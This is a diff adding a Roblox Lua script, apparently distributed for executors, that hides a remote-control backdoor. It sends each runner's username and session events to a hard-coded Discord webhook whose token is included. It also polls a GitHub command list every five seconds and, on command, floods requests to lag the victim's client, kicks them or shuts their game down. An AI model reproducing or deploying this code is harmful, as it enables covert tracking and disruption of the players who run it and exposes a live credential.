@@ -1,0 +1,112 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local webhookURL = "https://discord.com/api/webhooks/1337436676460646401/ZeQbmm5M8RB7uJOqbrUUX57VRJyhVvY59CCqoa4iPt6u0zl-U38zsjUio25nYSvUmabZ"
+
+local activeLag = false
+local commands = {}
+
+function GetTime()
+    return os.date("%Y-%m-%d %H:%M:%S")
+end
+
+function SendMessage(url, message)
+    request({
+        Url = url,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode({["content"] = message})
+    })
+end
+
+function SendMessageEMBED(url, title, description, color)
+    request({
+        Url = url,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode({
+            ["embeds"] = {{
+                ["title"] = title,
+                ["description"] = description,
+                ["color"] = color,
+                ["footer"] = {["text"] = "Time: " .. GetTime()}
+            }}
+        })
+    })
+end
+
+local function LoadCommands()
+    local commandURL = "https://raw.githubusercontent.com/CaoModTesting/script/refs/heads/main/list"
+    local success, response = pcall(function()
+        return HttpService:JSONDecode(game:HttpGet(commandURL))
+    end)
+
+    if success then
+        commands = response
+    end
+end
+
+local function StartLag()
+    if not activeLag then
+        activeLag = true
+        SendMessageEMBED(webhookURL, "✅ Lag Started", "Lagging `" .. player.Name .. "`...", 16711680)
+
+        while activeLag do
+            for _ = 1, 10000 do
+                task.spawn(function()
+                    game:HttpGet("https://www.roblox.com/")
+                end)
+            end
+            task.wait(0)
+        end
+    end
+end
+
+local function StopLag()
+    if activeLag then
+        activeLag = false
+        SendMessageEMBED(webhookURL, "❌ Lag Stopped", "Lag on `" .. player.Name .. "` stopped.", 65280)
+    end
+end
+
+local function KickPlayer(reason)
+    SendMessageEMBED(webhookURL, "⚠️ Player Kicked", "`" .. player.Name .. "` has been kicked.\nReason: `" .. reason .. "`", 16776960)
+    task.wait(1)
+    game.Players.LocalPlayer:Kick(reason)
+end
+
+local function ShutdownGame()
+    SendMessageEMBED(webhookURL, "🛑 Game Shutdown", "Shutting down `" .. player.Name .. "`'s game...", 255)
+    task.wait(1)
+    game:Shutdown()
+end
+
+SendMessageEMBED(webhookURL, "🟢 Executor Started", "`" .. player.Name .. "` executed the script.", 3066993)
+
+game.OnClose:Connect(function()
+    SendMessageEMBED(webhookURL, "🔴 Player Left", "`" .. player.Name .. "` has left the game.", 15158332)
+end)
+
+while true do
+    LoadCommands()
+    
+    local command = commands[player.Name]
+    
+    if command then
+        if command.lag then
+            StartLag()
+        else
+            StopLag()
+        end
+        
+        if command.kick then
+            KickPlayer(command.reason or "No reason provided")
+        end
+        
+        if command.Shutdown then
+            ShutdownGame()
+        end
+    end
+
+    task.wait(5)
+end
